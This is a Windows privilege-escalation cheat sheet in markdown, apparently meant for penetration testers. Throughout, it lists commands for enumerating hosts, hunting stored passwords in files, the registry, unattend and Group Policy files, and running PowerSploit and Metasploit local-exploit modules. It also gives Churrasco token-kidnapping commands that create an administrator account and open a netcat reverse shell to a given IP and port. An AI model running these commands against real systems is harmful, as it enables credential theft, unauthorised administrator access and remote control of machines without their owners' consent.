#### Information Gathering
- systeminfo ***OS info***
- hostname ***host info***
- net users ***users info***
- net user <user_name>
- ipconfig /all ***network interfaces and routing table.***
- route print
- arp -A
- netstat -ano ***network connections and the firewall rules***
- netsh firewall show state
- netsh firewall show state
- netsh firewall show config
- schtasks /query /fo LIST /v ***scheduled tasks, running processes, started services and installed drivers.***
- tasklist /SVC
- net start

#### Service available form inside
- netstat -ano
----------------------------------------------------------------------------------------------------------------------------------
#### Kernel Exploit ****
- Missing Patches
```
The HotFixID can be used in correlation with the table below in order to discover any missing patches related to privilege escalation. As the focus is on privilege escalation the command can be modified slightly to discover patches based on the KB number.
- wmic qfe get Caption,Description,HotFixID,InstalledOn
```
- PowerShell identify patches that can lead to privilege escalation
```
This script is called Sherlock and it will check a system for the following:
```
|Operating System	|Description	|Security Bulletin	|KB|
|Windows Server 2016	Windows Kernel Mode Drivers|	MS16-135|	3199135|	
|Windows Server 2008 ,7,8,10 Windows Server 2012|	Secondary Logon Handle|	MS16-032|	3143141|

----------------------------------------------------------------------------------------------------------------------------------
#### Stored Credentials
***Find passwords in Windows File***
- findstr /si password *.txt
- findstr /si password *.xml
- findstr /si password *.ini
- findstr /spin "password" *.*
- C:\> dir /s *pass* == *cred* == *vnc* == *.config*
- C:\> dir /b /s unattend.xml
- C:\> dir /b /s web.config
- C:\> dir /b /s sysprep.inf
- C:\> dir /b /s sysprep.xml
- C:\> dir /b /s *pass*
- C:\> dir /b /s vnc.ini

***password stored in windows files***
- C:\sysprep.inf
- C:\sysprep\sysprep.xml
- C:\unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
- C:\inetpub\wwwroot\web.config
- dir c:\*vnc.ini /s /b
- dir c:\*ultravnc.ini /s /b 
- dir c:\ /s /b | findstr /si *vnc.ini
- *Group Policy Preferences* The Groups.xml file contains the password is cached locally.
```
C:\ProgramData\Microsoft\Group Policy\History\????\Machine\Preferences\Groups\Groups.xml
\\????\SYSVOL\\Policies\????\MACHINE\Preferences\Groups\Groups.xml
```
- Other policy preference files
```
Services\Services.xml
ScheduledTasks\ScheduledTasks.xml
Printers\Printers.xml
Drives\Drives.xml
DataSources\DataSources.xml
```
***In Registry***
- ***Putty*** : reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
- ***SNMP Paramters*** : reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
- ***Windows autologin*** : reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
- ***VNC*** : reg query "HKCU\Software\ORL\WinVNC3\Password"
- ***Search for password in registry*** : reg query HKLM /f password /t REG_SZ /s ***OR*** reg query HKCU /f password /t REG_SZ /s
- reg query HKLM /f password /t REG_SZ /s
- reg query HKCU /f password /t REG_SZ /s
- ***McAfee*** : %AllUsersProfile%Application Data\McAfee\Common Framework\SiteList.xml

***PowerSploit***
```
Get-UnattendedInstallFile
Get-Webconfig
Get-ApplicationHost
Get-SiteListPassword
Get-CachedGPPPassword
Get-RegistryAutoLogon
```
----------------------------------------------------------------------------------------------------------------------------------
#### With meterpreter
- use post/windows/gather/enum_patches
  - set SESSION 1
  - set KB "KB3143142", "KB31432342"
  - run
- use post/multi/recon/local_exploit_suggester
  - set session ?
  - run

- example: use exploit/windows/local/ms10_015_kitrap0d
  - options
  - run
----------------------------------------------------------------------------------------------------------------------------------
#### Windows Exploit Suggester 
compares the patch level of a system against the Microsoft vulnerability database and can be used to identify those exploits that could lead to privilege escalation. The only requirement is that requires the system information from the target.

----------------------------------------------------------------------------------------------------------------------------------
#### Churrasco Use Local Privilages Escalation via Token Kidnapping
- churrasco.bin "net user user_login user_password /add && net localgroup Administrators user_login /add"

###### Add user to Remote Desktop Users
- churrasco "NET LOCALGROUP "Remote Desktop Users" user_login /ADD"

###### Reverse shell via Admin and currasco  (need nc.exe)
churrasco.exe “nc.exe ip port -e cmd.exe”
- ***Churrasco*** https://www.exploit-db.com/exploits/6705
----------------------------------------------------------------------------------------------------------------------------------
#### Usefull scrips

- ***Windows Exploit Suggester*** https://github.com/AonCyberLabs/Windows-Exploit-Suggester
- ***JustAnotherWindowsScript(Enum)*** https://github.com/411Hall/JAWS
- ***Impacket*** https://github.com/SecureAuthCorp/impacket
- ***Nishang*** https://github.com/samratashok/nishang
- ***PowerSploit*** https://github.com/PowerShellMafia/PowerSploit
- ***Sherlock*** https://github.com/rasta-mouse/Sherlock
- ***Watson** https://github.com/rasta-mouse/Watson
